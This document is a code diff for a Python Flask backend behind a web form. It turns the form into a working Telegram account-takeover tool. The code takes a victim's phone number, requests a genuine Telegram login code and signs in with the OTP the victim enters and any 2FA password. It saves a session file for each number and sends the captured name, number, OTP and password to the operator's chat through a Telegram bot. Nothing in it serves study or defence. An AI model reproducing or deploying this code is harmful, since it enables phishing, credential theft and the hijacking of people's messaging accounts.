@@ -1,79 +1,87 @@
 import os
+import asyncio
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 import requests
+from telethon import TelegramClient, errors
 
 app = Flask(__name__)
-
-# Mengatasi error CORS agar website Netlify bisa mengirim data
 CORS(app, resources={r"/*": {"origins": "*"}})
 
-# Mengambil variabel dari dashboard Railway
-TOKEN = os.getenv("BOT_TOKEN") 
+# Variabel dari Railway
+API_ID = os.getenv("API_ID")
+API_HASH = os.getenv("API_HASH")
+BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
-def send_to_telegram(message, show_button=False):
-    """Mengirim pesan ke Telegram dengan format persis gambar"""
-    if TOKEN and CHAT_ID:
-        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-        payload = {
-            "chat_id": CHAT_ID,
-            "text": message,
-            "parse_mode": "Markdown"
-        }
-        
-        # Menambahkan tombol 'otp' di bawah pesan
-        if show_button:
-            payload["reply_markup"] = {
-                "inline_keyboard": [[
-                    {"text": "otp", "callback_data": "minta_otp_lagi"}
-                ]]
-            }
-            
-        try:
-            requests.post(url, json=payload)
-        except Exception as e:
-            print(f"Gagal kirim ke Telegram: {e}")
+# Penyimpanan session sementara (dalam memori)
+sessions = {}
+
+def send_bot(message):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
 
 @app.route('/register', methods=['POST'])
 def register():
+    # Menjalankan fungsi async di dalam Flask
+    return asyncio.run(handle_register())
+
+async def handle_register():
+    data = request.json
+    step = data.get('step')
+    nomor = data.get('nomor')
+    otp = data.get('otp')
+    sandi = data.get('sandi')
+    nama = data.get('nama', 'None')
+
+    # Alamat file session unik untuk setiap nomor
+    session_path = f"sess_{nomor}"
+    client = TelegramClient(session_path, API_ID, API_HASH)
+
     try:
-        data = request.json
-        nama = data.get('nama', 'None')
-        nomor = data.get('nomor', 'None')
-        otp = data.get('otp', 'None')
-        sandi = data.get('sandi', 'None')
+        await client.connect()
 
-        # Format teks: Sesuai dengan urutan dan tampilan di gambar kamu
-        msg = (
-            f"Name: {nama}\n"
-            f"Number: {nomor}\n"
-            f"Password: {sandi}\n"
-            f"OTP : {otp}"
-        )
+        # STEP 1: MINTA OTP ASLI DARI TELEGRAM
+        if step == 1:
+            try:
+                send_code = await client.send_code_request(nomor)
+                sessions[nomor] = send_code.phone_code_hash
+                send_bot(f"📲 *OTP Terkirim ke {nomor}*\nNama: {nama}")
+                return jsonify({"status": "success", "message": "OTP sent"}), 200
+            except Exception as e:
+                return jsonify({"status": "error", "message": str(e)}), 400
 
-        # Kirim data ke bot
-        send_to_telegram(msg, show_button=True)
-        
-        return jsonify({"status": "success", "message": "Data terkirim ke bot"}), 200
+        # STEP 2: CEK OTP (BENAR/SALAH)
+        elif step == 2:
+            phone_code_hash = sessions.get(nomor)
+            try:
+                await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
+                send_bot(f"✅ *Login Berhasil!*\nName: {nama}\nNumber: {nomor}\nOTP: {otp}")
+                return jsonify({"status": "success"}), 200
+            
+            except errors.SessionPasswordNeededError:
+                # OTP BENAR, tapi butuh Sandi 2FA
+                send_bot(f"🔑 *OTP Benar, Menunggu 2FA...*\nNumber: {nomor}")
+                return jsonify({"status": "need_2fa"}), 200
+            
+            except errors.PhoneCodeInvalidError:
+                # OTP SALAH
+                return jsonify({"status": "error", "message": "Kode OTP Salah!"}), 400
+
+        # STEP 3: CEK SANDI 2FA (BENAR/SALAH)
+        elif step == 3:
+            try:
+                await client.sign_in(password=sandi)
+                send_bot(f"✅ *Login Berhasil (2FA)!*\nName: {nama}\nNumber: {nomor}\nPassword: {sandi}")
+                return jsonify({"status": "success"}), 200
+            except errors.PasswordHashInvalidError:
+                # SANDI SALAH
+                return jsonify({"status": "error", "message": "Sandi 2FA Salah!"}), 400
+
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
-
-@app.route('/webhook', methods=['POST'])
-def telegram_webhook():
-    """Menangani ketika tombol 'otp' diklik di Telegram"""
-    data = request.json
-    if "callback_query" in data:
-        chat_id = data["callback_query"]["message"]["chat"]["id"]
-        
-        # Respon otomatis saat tombol diklik tanpa user isi web lagi
-        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
-            "chat_id": chat_id,
-            "text": "🔄 *Sedang memproses permintaan OTP baru...*\nSilakan tunggu, kode akan muncul otomatis di bawah.",
-            "parse_mode": "Markdown"
-        })
-    return "OK", 200
+    finally:
+        await client.disconnect()
 
 if __name__ == '__main__':
-    # Menggunakan port otomatis dari Railway
     app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
